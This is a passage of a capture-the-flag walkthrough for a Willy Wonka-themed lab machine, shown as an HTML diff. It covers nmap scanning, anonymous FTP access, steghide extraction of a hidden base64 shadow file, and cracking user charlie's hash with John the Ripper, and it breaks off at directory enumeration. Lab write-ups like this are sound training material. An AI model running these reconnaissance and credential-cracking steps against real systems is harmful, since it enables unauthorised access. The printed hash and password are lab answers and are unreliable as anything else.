+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|__
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:____________________;________________\|\r\n\r\nA\x20small\x20hint\x20fr
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:om\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20her
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:e!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\&#34;\x20&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==============</span>NEXT SERVICE FINGERPRINT <span style="color:#f92672">(</span>SUBMIT INDIVIDUALLY<span style="color:#f92672">)==============</span>
+</span></span><span style="display:flex;"><span>SF-Port110-TCP:V<span style="color:#f92672">=</span>7.93%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>12/13%Time<span style="color:#f92672">=</span>6398CE3D%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>NU
+</span></span><span style="display:flex;"><span>SF:LL,20F,<span style="color:#e6db74">&#34;\&#34;Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20_
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:__\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20\.&#39;\\__\\&#39;\\__\\&#39;\\__\\&#39;\\__\\&#39;\\__,`\x20\x20\x20\.\x20\x20____\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF::\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\&#39;\\__\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\&#39;\\__\\&#39;\\__\\&#39;\\__\\&#39;\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20\x20\x20\\\\&#39;\\__\\&#39;\\__\\&#39;\\__\\\x20\\__\\&#39;\\_;-----------------
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|________
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:______________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\&#34;\x20&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Gene
+</span></span><span style="display:flex;"><span>SF:ricLines,20F,<span style="color:#e6db74">&#34;\&#34;Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\r\n\x20\x20\.&#39;\\__\\&#39;\\__\\&#39;\\__\\&#39;\\__\\&#39;\\__,`\x20\x20\x20\.\x20\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:____\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:/\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:&#39;\\__\\&#39;\\__\\&#39;\\__\\&#39;\\__\\&#39;\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF::\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20\x20\x20\\\\&#39;\\__\\&#39;\\__\\&#39;\\__\\\x20\\__\\&#39;\\_;-----------
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:------`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|__
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:____________________;________________\|\r\n\r\nA\x20small\x20hint\x20fr
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:om\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20her
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:e!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\&#34;\x20&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 287.10 seconds
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nmap 10.10.5.181        
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-12-13 14:17 EST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.5.181
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.055s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">989</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE
+</span></span><span style="display:flex;"><span>21/tcp  open  ftp
+</span></span><span style="display:flex;"><span>22/tcp  open  ssh
+</span></span><span style="display:flex;"><span>80/tcp  open  http
+</span></span><span style="display:flex;"><span>100/tcp open  newacct
+</span></span><span style="display:flex;"><span>106/tcp open  pop3pw
+</span></span><span style="display:flex;"><span>109/tcp open  pop2
+</span></span><span style="display:flex;"><span>110/tcp open  pop3
+</span></span><span style="display:flex;"><span>111/tcp open  rpcbind
+</span></span><span style="display:flex;"><span>113/tcp open  ident
+</span></span><span style="display:flex;"><span>119/tcp open  nntp
+</span></span><span style="display:flex;"><span>125/tcp open  locus-map
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 1.66 seconds
+</span></span></code></pre></div><h2 id="ftp">FTP<a href="#ftp" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I see all files and I get the image (Credentials &ndash;&gt; <code>Anonymous:Anonymous</code>):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ftp 10.10.5.181
+</span></span><span style="display:flex;"><span>Connected to 10.10.5.181.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">220</span> <span style="color:#f92672">(</span>vsFTPd 3.0.3<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Name <span style="color:#f92672">(</span>10.10.5.181:kali<span style="color:#f92672">)</span>: Anonymous
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">331</span> Please specify the password.
+</span></span><span style="display:flex;"><span>Password: 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">230</span> Login successful.
+</span></span><span style="display:flex;"><span>Remote system type is UNIX.
+</span></span><span style="display:flex;"><span>Using binary mode to transfer files.
+</span></span><span style="display:flex;"><span>ftp&gt; ls
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|44103|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Here comes the directory listing.
+</span></span><span style="display:flex;"><span>-rw-rw-r--    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1000</span>     <span style="color:#ae81ff">1000</span>       <span style="color:#ae81ff">208838</span> Sep <span style="color:#ae81ff">30</span>  <span style="color:#ae81ff">2020</span> gum_room.jpg
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Directory send OK.
+</span></span><span style="display:flex;"><span>ftp&gt; get gum_room.jpg
+</span></span><span style="display:flex;"><span>local: gum_room.jpg remote: gum_room.jpg
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|45638|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Opening BINARY mode data connection <span style="color:#66d9ef">for</span> gum_room.jpg <span style="color:#f92672">(</span><span style="color:#ae81ff">208838</span> bytes<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>100% |**********************************************************************************************************************************************************************************************|   <span style="color:#ae81ff">203</span> KiB  798.68 KiB/s    00:00 ETA
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transfer complete.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">208838</span> bytes received in 00:00 <span style="color:#f92672">(</span>648.83 KiB/s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>ftp&gt; 
+</span></span></code></pre></div><h2 id="steganography">Steganography<a href="#steganography" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I see the info, the password is <code>empty</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ steghide --info gum_room.jpg
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;gum_room.jpg&#34;</span>:
+</span></span><span style="display:flex;"><span>  format: jpeg
+</span></span><span style="display:flex;"><span>  capacity: 10.9 KB
+</span></span><span style="display:flex;"><span>Try to get information about embedded data ? <span style="color:#f92672">(</span>y/n<span style="color:#f92672">)</span> y
+</span></span><span style="display:flex;"><span>Enter passphrase: 
+</span></span><span style="display:flex;"><span>  embedded file <span style="color:#e6db74">&#34;b64.txt&#34;</span>:
+</span></span><span style="display:flex;"><span>    size: 2.5 KB
+</span></span><span style="display:flex;"><span>    encrypted: rijndael-128, cbc
+</span></span><span style="display:flex;"><span>    compressed: yes
+</span></span></code></pre></div><p>I extract the file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ steghide --extract -sf gum_room.jpg
+</span></span><span style="display:flex;"><span>Enter passphrase: 
+</span></span><span style="display:flex;"><span>wrote extracted data to <span style="color:#e6db74">&#34;b64.txt&#34;</span>.
+</span></span></code></pre></div><p>I read the file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat b64.txt     
+</span></span><span style="display:flex;"><span>ZGFlbW9uOio6MTgzODA6MDo5OTk5OTo3Ojo6CmJpbjoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpzeXM6
+</span></span><span style="display:flex;"><span>KjoxODM4MDowOjk5OTk5Ojc6OjoKc3luYzoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpnYW1lczoqOjE4
+</span></span><span style="display:flex;"><span>MzgwOjA6OTk5OTk6Nzo6OgptYW46KjoxODM4MDowOjk5OTk5Ojc6OjoKbHA6KjoxODM4MDowOjk5
+</span></span><span style="display:flex;"><span>OTk5Ojc6OjoKbWFpbDoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpuZXdzOio6MTgzODA6MDo5OTk5OTo3
+</span></span><span style="display:flex;"><span>Ojo6CnV1Y3A6KjoxODM4MDowOjk5OTk5Ojc6OjoKcHJveHk6KjoxODM4MDowOjk5OTk5Ojc6OjoK
+</span></span><span style="display:flex;"><span>d3d3LWRhdGE6KjoxODM4MDowOjk5OTk5Ojc6OjoKYmFja3VwOio6MTgzODA6MDo5OTk5OTo3Ojo6
+</span></span><span style="display:flex;"><span>Cmxpc3Q6KjoxODM4MDowOjk5OTk5Ojc6OjoKaXJjOio6MTgzODA6MDo5OTk5OTo3Ojo6CmduYXRz
+</span></span><span style="display:flex;"><span>Oio6MTgzODA6MDo5OTk5OTo3Ojo6Cm5vYm9keToqOjE4MzgwOjA6OTk5OTk6Nzo6OgpzeXN0ZW1k
+</span></span><span style="display:flex;"><span>LXRpbWVzeW5jOio6MTgzODA6MDo5OTk5OTo3Ojo6CnN5c3RlbWQtbmV0d29yazoqOjE4MzgwOjA6
+</span></span><span style="display:flex;"><span>OTk5OTk6Nzo6OgpzeXN0ZW1kLXJlc29sdmU6KjoxODM4MDowOjk5OTk5Ojc6OjoKX2FwdDoqOjE4
+</span></span><span style="display:flex;"><span>MzgwOjA6OTk5OTk6Nzo6OgpteXNxbDohOjE4MzgyOjA6OTk5OTk6Nzo6Ogp0c3M6KjoxODM4Mjow
+</span></span><span style="display:flex;"><span>Ojk5OTk5Ojc6OjoKc2hlbGxpbmFib3g6KjoxODM4MjowOjk5OTk5Ojc6OjoKc3Ryb25nc3dhbjoq
+</span></span><span style="display:flex;"><span>OjE4MzgyOjA6OTk5OTk6Nzo6OgpudHA6KjoxODM4MjowOjk5OTk5Ojc6OjoKbWVzc2FnZWJ1czoq
+</span></span><span style="display:flex;"><span>OjE4MzgyOjA6OTk5OTk6Nzo6OgphcnB3YXRjaDohOjE4MzgyOjA6OTk5OTk6Nzo6OgpEZWJpYW4t
+</span></span><span style="display:flex;"><span>ZXhpbTohOjE4MzgyOjA6OTk5OTk6Nzo6Ogp1dWlkZDoqOjE4MzgyOjA6OTk5OTk6Nzo6OgpkZWJp
+</span></span><span style="display:flex;"><span>YW4tdG9yOio6MTgzODI6MDo5OTk5OTo3Ojo6CnJlZHNvY2tzOiE6MTgzODI6MDo5OTk5OTo3Ojo6
+</span></span><span style="display:flex;"><span>CmZyZWVyYWQ6KjoxODM4MjowOjk5OTk5Ojc6OjoKaW9kaW5lOio6MTgzODI6MDo5OTk5OTo3Ojo6
+</span></span><span style="display:flex;"><span>CnRjcGR1bXA6KjoxODM4MjowOjk5OTk5Ojc6OjoKbWlyZWRvOio6MTgzODI6MDo5OTk5OTo3Ojo6
+</span></span><span style="display:flex;"><span>CmRuc21hc3E6KjoxODM4MjowOjk5OTk5Ojc6OjoKcmVkaXM6KjoxODM4MjowOjk5OTk5Ojc6OjoK
+</span></span><span style="display:flex;"><span>dXNibXV4Oio6MTgzODI6MDo5OTk5OTo3Ojo6CnJ0a2l0Oio6MTgzODI6MDo5OTk5OTo3Ojo6CnNz
+</span></span><span style="display:flex;"><span>aGQ6KjoxODM4MjowOjk5OTk5Ojc6OjoKcG9zdGdyZXM6KjoxODM4MjowOjk5OTk5Ojc6OjoKYXZh
+</span></span><span style="display:flex;"><span>aGk6KjoxODM4MjowOjk5OTk5Ojc6OjoKc3R1bm5lbDQ6IToxODM4MjowOjk5OTk5Ojc6OjoKc3Ns
+</span></span><span style="display:flex;"><span>aDohOjE4MzgyOjA6OTk5OTk6Nzo6OgpubS1vcGVudnBuOio6MTgzODI6MDo5OTk5OTo3Ojo6Cm5t
+</span></span><span style="display:flex;"><span>LW9wZW5jb25uZWN0Oio6MTgzODI6MDo5OTk5OTo3Ojo6CnB1bHNlOio6MTgzODI6MDo5OTk5OTo3
+</span></span><span style="display:flex;"><span>Ojo6CnNhbmVkOio6MTgzODI6MDo5OTk5OTo3Ojo6CmluZXRzaW06KjoxODM4MjowOjk5OTk5Ojc6
+</span></span><span style="display:flex;"><span>OjoKY29sb3JkOio6MTgzODI6MDo5OTk5OTo3Ojo6CmkycHN2YzoqOjE4MzgyOjA6OTk5OTk6Nzo6
+</span></span><span style="display:flex;"><span>OgpkcmFkaXM6KjoxODM4MjowOjk5OTk5Ojc6OjoKYmVlZi14c3M6KjoxODM4MjowOjk5OTk5Ojc6
+</span></span><span style="display:flex;"><span>OjoKZ2VvY2x1ZToqOjE4MzgyOjA6OTk5OTk6Nzo6OgpsaWdodGRtOio6MTgzODI6MDo5OTk5OTo3
+</span></span><span style="display:flex;"><span>Ojo6CmtpbmctcGhpc2hlcjoqOjE4MzgyOjA6OTk5OTk6Nzo6OgpzeXN0ZW1kLWNvcmVkdW1wOiEh
+</span></span><span style="display:flex;"><span>OjE4Mzk2Ojo6Ojo6Cl9ycGM6KjoxODQ1MTowOjk5OTk5Ojc6OjoKc3RhdGQ6KjoxODQ1MTowOjk5
+</span></span><span style="display:flex;"><span>OTk5Ojc6OjoKX2d2bToqOjE4NDk2OjA6OTk5OTk6Nzo6OgpjaGFybGllOiQ2JENaSm5DUGVRV3A5
+</span></span><span style="display:flex;"><span>L2pwTngka2hHbEZkSUNKbnI4UjNKQy9qVFIycjdEcmJGTHA4enE4NDY5ZDNjMC56dUtONHNlNjFG
+</span></span><span style="display:flex;"><span>T2J3V0d4Y0hacU8yUkpIa2tMMWpqUFllZUd5SUpXRTgyWC86MTg1MzU6MDo5OTk5OTo3Ojo6Cg<span style="color:#f92672">==</span>
+</span></span></code></pre></div><p>I decode the file, thanks at the name of file I know that I must coding use <code>base64</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ base64 --decode /home/kali/b64.txt  &gt; passwd.txt  
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                                           
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat passwd.txt  
+</span></span><span style="display:flex;"><span>daemon:*:18380:0:99999:7:::
+</span></span><span style="display:flex;"><span>bin:*:18380:0:99999:7:::
+</span></span><span style="display:flex;"><span>sys:*:18380:0:99999:7:::
+</span></span><span style="display:flex;"><span>sync:*:18380:0:99999:7:::
+</span></span><span style="display:flex;"><span>games:*:18380:0:99999:7:::
+</span></span><span style="display:flex;"><span>man:*:18380:0:99999:7:::
+</span></span><span style="display:flex;"><span>lp:*:18380:0:99999:7:::
+</span></span><span style="display:flex;"><span>mail:*:18380:0:99999:7:::
+</span></span><span style="display:flex;"><span>news:*:18380:0:99999:7:::
+</span></span><span style="display:flex;"><span>uucp:*:18380:0:99999:7:::
+</span></span><span style="display:flex;"><span>proxy:*:18380:0:99999:7:::
+</span></span><span style="display:flex;"><span>www-data:*:18380:0:99999:7:::
+</span></span><span style="display:flex;"><span>backup:*:18380:0:99999:7:::
+</span></span><span style="display:flex;"><span>list:*:18380:0:99999:7:::
+</span></span><span style="display:flex;"><span>irc:*:18380:0:99999:7:::
+</span></span><span style="display:flex;"><span>gnats:*:18380:0:99999:7:::
+</span></span><span style="display:flex;"><span>nobody:*:18380:0:99999:7:::
+</span></span><span style="display:flex;"><span>systemd-timesync:*:18380:0:99999:7:::
+</span></span><span style="display:flex;"><span>systemd-network:*:18380:0:99999:7:::
+</span></span><span style="display:flex;"><span>systemd-resolve:*:18380:0:99999:7:::
+</span></span><span style="display:flex;"><span>_apt:*:18380:0:99999:7:::
+</span></span><span style="display:flex;"><span>mysql:!:18382:0:99999:7:::
+</span></span><span style="display:flex;"><span>tss:*:18382:0:99999:7:::
+</span></span><span style="display:flex;"><span>shellinabox:*:18382:0:99999:7:::
+</span></span><span style="display:flex;"><span>strongswan:*:18382:0:99999:7:::
+</span></span><span style="display:flex;"><span>ntp:*:18382:0:99999:7:::
+</span></span><span style="display:flex;"><span>messagebus:*:18382:0:99999:7:::
+</span></span><span style="display:flex;"><span>arpwatch:!:18382:0:99999:7:::
+</span></span><span style="display:flex;"><span>Debian-exim:!:18382:0:99999:7:::
+</span></span><span style="display:flex;"><span>uuidd:*:18382:0:99999:7:::
+</span></span><span style="display:flex;"><span>debian-tor:*:18382:0:99999:7:::
+</span></span><span style="display:flex;"><span>redsocks:!:18382:0:99999:7:::
+</span></span><span style="display:flex;"><span>freerad:*:18382:0:99999:7:::
+</span></span><span style="display:flex;"><span>iodine:*:18382:0:99999:7:::
+</span></span><span style="display:flex;"><span>tcpdump:*:18382:0:99999:7:::
+</span></span><span style="display:flex;"><span>miredo:*:18382:0:99999:7:::
+</span></span><span style="display:flex;"><span>dnsmasq:*:18382:0:99999:7:::
+</span></span><span style="display:flex;"><span>redis:*:18382:0:99999:7:::
+</span></span><span style="display:flex;"><span>usbmux:*:18382:0:99999:7:::
+</span></span><span style="display:flex;"><span>rtkit:*:18382:0:99999:7:::
+</span></span><span style="display:flex;"><span>sshd:*:18382:0:99999:7:::
+</span></span><span style="display:flex;"><span>postgres:*:18382:0:99999:7:::
+</span></span><span style="display:flex;"><span>avahi:*:18382:0:99999:7:::
+</span></span><span style="display:flex;"><span>stunnel4:!:18382:0:99999:7:::
+</span></span><span style="display:flex;"><span>sslh:!:18382:0:99999:7:::
+</span></span><span style="display:flex;"><span>nm-openvpn:*:18382:0:99999:7:::
+</span></span><span style="display:flex;"><span>nm-openconnect:*:18382:0:99999:7:::
+</span></span><span style="display:flex;"><span>pulse:*:18382:0:99999:7:::
+</span></span><span style="display:flex;"><span>saned:*:18382:0:99999:7:::
+</span></span><span style="display:flex;"><span>inetsim:*:18382:0:99999:7:::
+</span></span><span style="display:flex;"><span>colord:*:18382:0:99999:7:::
+</span></span><span style="display:flex;"><span>i2psvc:*:18382:0:99999:7:::
+</span></span><span style="display:flex;"><span>dradis:*:18382:0:99999:7:::
+</span></span><span style="display:flex;"><span>beef-xss:*:18382:0:99999:7:::
+</span></span><span style="display:flex;"><span>geoclue:*:18382:0:99999:7:::
+</span></span><span style="display:flex;"><span>lightdm:*:18382:0:99999:7:::
+</span></span><span style="display:flex;"><span>king-phisher:*:18382:0:99999:7:::
+</span></span><span style="display:flex;"><span>systemd-coredump:!!:18396::::::
+</span></span><span style="display:flex;"><span>_rpc:*:18451:0:99999:7:::
+</span></span><span style="display:flex;"><span>statd:*:18451:0:99999:7:::
+</span></span><span style="display:flex;"><span>_gvm:*:18496:0:99999:7:::
+</span></span><span style="display:flex;"><span>charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
+</span></span></code></pre></div><p>I have discover:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>- Username: charlie
+</span></span><span style="display:flex;"><span>- Password: $6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/
+</span></span></code></pre></div><h2 id="crack-the-hash">Crack the Hash<a href="#crack-the-hash" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I put the hash (Password) in a file and  crack with <code>John The Ripper</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ john passwd.txt -wordlist:/usr/share/wordlists/rockyou.txt 
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>sha512crypt, crypt<span style="color:#f92672">(</span>3<span style="color:#f92672">)</span> $6$ <span style="color:#f92672">[</span>SHA512 256/256 AVX2 4x<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>iteration count<span style="color:#f92672">)</span> is <span style="color:#ae81ff">5000</span> <span style="color:#66d9ef">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">4</span> OpenMP threads
+</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+</span></span><span style="display:flex;"><span>cn7824           <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span>     
+</span></span><span style="display:flex;"><span>1g 0:00:03:52 DONE <span style="color:#f92672">(</span>2022-12-13 14:46<span style="color:#f92672">)</span> 0.004301g/s 4234p/s 4234c/s 4234C/s codify..cn123
+</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span style="display:flex;"><span>Session completed.
+</span></span></code></pre></div><p>I have discover:</p>
+<pre tabindex="0"><code>- Username: charlie
+- Password: cn7824
+</code></pre><p>What is Charlie&rsquo;s password? <code>cn7824</code></p>
+<h2 id="directory-enumeration">Directory Enumeration<a href="#directory-enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I do a directory enumeration with <code>gobuster</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo gobuster dir -u http://10.10.5.181/ -w /home/prowl/SecLists/Discovery/Web-Content/big.txt 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.4
